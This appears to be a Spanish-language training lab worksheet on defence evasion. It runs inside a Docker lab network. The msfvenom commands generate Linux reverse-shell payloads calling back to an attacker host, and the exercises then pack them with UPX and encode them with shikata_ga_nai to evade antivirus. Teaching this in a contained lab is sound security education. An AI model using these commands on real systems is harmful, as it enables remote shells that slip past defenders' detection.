# 🦸 Unit 6: Evasión de Defensas - LAB PRÁCTICO

## 🎯 Objetivos

Practicar **técnicas de evasión**:

1. **Obfuscación de payloads** - Evadir AV
2. **Encoding** - Codificar payloads
3. **Anti-debug** - Evadir análisis
4. **Evasión de firewalls**

---

## 🏗️ Arquitectura

```
┌──────────────────────────────────────────────────────────────────┐
│                      LABORATORIO 6                                │
│                    EVASIÓN DE DEFENSAS                              │
├──────────────────────────────────────────────────────────────────┤
│   ┌─────────────┐                            ┌─────────────┐      │
│   │    KALI    │        ATAQUE              │  OBJETIVO  │      │
│   │   LINUX    │  ──────────────────────→    │   WINDOWS  │      │
│   │ (Atacante) │                            │             │      │
│   └─────────────┘                            └─────────────┘      │
│        │                                            │              │
│        │  • msfvenom                                │              │
│        │  • UPX                                  │              │
│        │  • Veil                                 │              │
│        │            RED: 192.168.61.0/24        │              │
└────────┼──────────────────────────────────────────┼──────────────┘
         │
    SSH:2222
```

---

## 🚀 Iniciar

```bash
cd docker-labs/unit6
docker-compose up -d
```

---

## ⚔️ EJERCICIOS DE ATAQUE

### Ejercicio 1: Generar Payload

```bash
ssh root@localhost -p 2222

# Payload básico
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.61.x LPORT=4444 -f elf -o shell.elf

# Ver detección
file shell.elf
```

### Ejercicio 2: Ofuscación con UPX

```bash
# Comprimir payload
upx -9 -o shell_packed.elf shell.elf

# Verificar
ls -lh shell*.elf
```

### Ejercicio 3: Encoding

```bash
# XOR encoding
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.61.x LPORT=4444 -f elf -e x86/shikata_ga_nai -i 5 -o shell_encoded.elf
```

### Ejercicio 4: Verificar con VirusTotal (simulado)

```bash
# Hash del payload
sha256sum shell*.elf
```

---

## 🛑 Cleanup

```bash
docker-compose down -v
```
